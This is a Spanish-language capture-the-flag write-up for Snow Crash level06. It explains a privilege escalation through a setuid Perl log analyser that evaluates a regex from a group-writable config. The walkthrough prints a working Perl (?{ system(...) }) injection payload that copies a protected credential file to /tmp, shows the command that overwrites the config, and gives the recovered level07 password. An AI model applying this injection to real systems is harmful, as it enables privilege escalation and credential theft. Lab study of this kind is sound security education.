# Level06 - Snow Crash

## Tipo de ejercicio

Ejecución de código Perl mediante una expresión regular controlada por el
usuario, combinada con un binario `setuid` y una configuración escribible por
el grupo correspondiente.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level07`.

La vulnerabilidad aparece en Perl mediante `use re 'eval'` y un patrón regular
obtenido de `raven.conf`.

## 1. Identificar el componente del nivel

Desde la sesión SSH de `level06`:

```bash
whoami
hostname
pwd
ls -la
cat README
```

El README contiene la pista:

```text
Nothing passes through the Raven unread.
```

Los archivos propios de los niveles se encuentran bajo `/opt/snowcrash`. La
ruta `/opt` se utiliza habitualmente para software adicional instalado fuera
de los directorios básicos del sistema. Por eso buscamos el componente en
`/opt/snowcrash/level06`:

```bash
ls -la /opt/snowcrash/level06
ls -l /opt/snowcrash/level06/raven
file /opt/snowcrash/level06/raven
strings -a /opt/snowcrash/level06/raven
```

`ls -la` muestra el contenido del directorio, incluidos los archivos ocultos.
`ls -l` muestra los permisos, el propietario y el grupo de `raven`.
`file` identifica el tipo de ejecutable sin iniciarlo y
`strings -a` extrae cadenas de texto legibles que pueden revelar rutas, intérpretes o nombres de archivos utilizados por el binario.

Resultado relevante:

```text
-r-sr-x--- 1 flag06 raven ... /opt/snowcrash/level06/raven
/opt/snowcrash/level06/raven: ELF 64-bit LSB pie executable
/usr/bin/perl
/opt/snowcrash/level06/raven.pl
```

El bit `setuid` hace que `raven` ejecute el script Perl con los privilegios de
`flag06`. Perl es un lenguaje de programación muy utilizado para procesar
texto y automatizar tareas del sistema.

## 2. Analizar raven.pl

```bash
sed -n '1,360p' /opt/snowcrash/level06/raven.pl
```

`sed -n '1,360p'` muestra las líneas 1 a 360 del script sin ejecutarlo, para
que podamos revisar cómo funciona `raven.pl`.

Las partes importantes son:

```perl
use re 'eval';
my $CONFIG_FILE = '/etc/raven/raven.conf';
...
if ($line =~ /$pattern/) {
		$file_matched++;
}
```

La expresión regular es `/$pattern/`, que aparece en la condición
`$line =~ /$pattern/`. La variable `$pattern` contiene el valor de
`loglevel_pattern`, que se leerá de la configuración en el siguiente paso.

La directiva `use re 'eval'` permite que ese valor incluya un bloque
`(?{ ... })` y que Perl ejecute su código mientras evalúa la expresión regular.
En este punto todavía no conocemos el contenido concreto del patrón.

`$CONFIG_FILE` señala `/etc/raven/raven.conf`. El programa obtiene de allí el
valor de `loglevel_pattern`, lo guarda en `$pattern` y después aplica ese
patrón a cada línea mediante `if ($line =~ /$pattern/)`. Consultaremos el
archivo en el siguiente paso para comprobar su contenido y sus permisos.


## 3. Confirmar los permisos de la configuración

El código de `raven.pl` ya ha mostrado que la configuración se encuentra en
`/etc/raven/raven.conf`. `/etc` es el directorio habitual para configuraciones
del sistema y de sus servicios, por eso comprobamos ahora esa ruta.

```bash
id
ls -ld /etc/raven
ls -l /etc/raven/raven.conf
cat /etc/raven/raven.conf
```

`id` muestra el usuario actual y sus grupos, incluida la pertenencia al grupo
`raven`.
`ls -ld` muestra los permisos, el propietario y el grupo del
directorio `/etc/raven` sin listar su contenido.
`ls -l` muestra esos mismos datos para `raven.conf`, y
`cat` muestra el contenido real de la configuración.

Resultado relevante:

```text
uid=1007(level06) ... groups=...,4006(raven)
drwxr-x--- 2 root raven ... /etc/raven
-rw-rw-r-- 1 root raven ... /etc/raven/raven.conf
```

`level06` pertenece al grupo `raven` y puede modificar el contenido del
archivo, aunque no puede crear archivos nuevos dentro del directorio. Por eso
se utiliza una redirección directa con `cat`, no `sed -i`, que necesitaría
crear un archivo temporal en `/etc/raven`.

## 4. Preparar el payload

En el repositorio se ha incluido el recurso auxiliar
[raven-payload.conf](raven-payload.conf), creado expresamente para documentar
el contenido temporal que escribiremos en `/etc/raven/raven.conf`.
No es un archivo original de la OVA. Su patrón ejecuta `cat` como `flag06` y guarda el
secreto en `/tmp`:

```text
loglevel_pattern = (?{ system('/bin/cat /home/flag06/.flag > /tmp/level06_flag.txt') })
```

Antes de modificar la configuración del servidor en ejecución, se guarda una
copia temporal:

```bash
cp /etc/raven/raven.conf /tmp/raven.conf.original
```

Después se instala temporalmente el contenido del recurso:

```bash
cat > /etc/raven/raven.conf <<'EOF'
log_dir = /var/log/snowcrash
max_size = 10485760
retention_days = 99999
loglevel_pattern = (?{ system('/bin/cat /home/flag06/.flag > /tmp/level06_flag.txt') })
EOF
```

`cat >` reemplaza temporalmente el contenido de `raven.conf`; el bloque
`<<'EOF'` escribe literalmente las líneas hasta encontrar el segundo `EOF`.
`log_dir` mantiene la ruta de los logs, `max_size` conserva el límite de
tamaño y `retention_days` evita que Raven descarte los logs antiguos antes de
evaluar el patrón. La línea `loglevel_pattern` contiene el bloque Perl que
ejecutará `cat` como `flag06`
y guardará la credencial en `/tmp`.

## 5. Ejecutar Raven y obtener la credencial

```bash
/opt/snowcrash/level06/raven
cat /tmp/level06_flag.txt
```

`/opt/snowcrash/level06/raven` inicia el analizador; por su bit `setuid`, el
script Perl y el patrón se ejecutan con los permisos de `flag06`. Durante el
procesamiento, el bloque `system(...)` crea `/tmp/level06_flag.txt`.
`cat` lee después ese archivo para mostrar la credencial obtenida.

La ejecución procesó los logs y mostró:

```text
Raven log analyser v2.4.1
	Total lines   : 6
	Matched       : 6
	Skipped files : 0
	Errors        : 0

wizelohxamaiuiia2uinaes4a
```

## 6. Restaurar la configuración

La imagen `.ova` no se modifica ni se crea una copia alterada. La escritura
realizada afecta temporalmente a un archivo escribible del servidor en
ejecución, que es el vector de explotación previsto por el nivel. Después de
leer la credencial se restaura el archivo original:

```bash
cp /tmp/raven.conf.original /etc/raven/raven.conf
```

## 7. Conectarse a level07

Desde el equipo anfitrión:

```bash
exit
ssh level07@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
wizelohxamaiuiia2uinaes4a
```

## Conclusión

El binario `raven` es `setuid` y ejecuta un analizador Perl como `flag06`. El
usuario `level06`, miembro del grupo `raven`, puede escribir la configuración.
El patrón `loglevel_pattern` se evalúa dentro de una expresión regular Perl
gracias a `use re 'eval'`, permitiendo ejecutar `cat` y leer `.flag` con los
privilegios elevados.
